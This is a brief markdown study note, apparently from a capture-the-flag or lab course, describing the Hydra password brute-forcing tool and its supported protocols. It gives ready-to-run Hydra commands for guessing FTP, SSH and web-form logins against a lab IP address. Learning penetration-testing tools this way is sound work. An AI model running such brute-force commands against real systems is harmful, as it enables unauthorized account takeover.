## Hydra

What is Hydra?
Hydra is a brute force online password cracking program; a quick system login password 'hacking' tool.

Hydra has the ability to bruteforce the following protocols: Asterisk, AFP, Cisco AAA, Cisco auth, Cisco enable, CVS, Firebird, FTP,  HTTP-FORM-GET, HTTP-FORM-POST, HTTP-GET, HTTP-HEAD, HTTP-POST, HTTP-PROXY, HTTPS-FORM-GET, HTTPS-FORM-POST, HTTPS-GET, HTTPS-HEAD, HTTPS-POST, HTTP-Proxy, ICQ, IMAP, IRC, LDAP, MS-SQL, MYSQL, NCP, NNTP, Oracle Listener, Oracle SID, Oracle, PC-Anywhere, PCNFS, POP3, POSTGRES, RDP, Rexec, Rlogin, Rsh, RTSP, SAP/R3, SIP, SMB, SMTP, SMTP Enum, SNMP v1+v2+v3, SOCKS5, SSH (v1 and v2), SSHKEY, Subversion, Teamspeak (TS2), Telnet, VMware-Auth, VNC and XMPP.

https://en.kali.tools/?p=220


![image](https://user-images.githubusercontent.com/105601437/222922462-c0cf02c3-92d4-4950-a0f1-6f4936706740.png)



<br>
FTP<br>
hydra -l user -P passlist.txt ftp://10.10.149.84

SSH<br>
hydra -l <username> -P <full path to pass> 10.10.149.84 -t 4 ssh

  
 Web Form<br>
hydra -l <username> -P <wordlist> 10.10.149.84 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V

![image](https://user-images.githubusercontent.com/105601437/222922525-00f5dcd8-d6b3-49d6-957f-4e9d64e65efd.png)
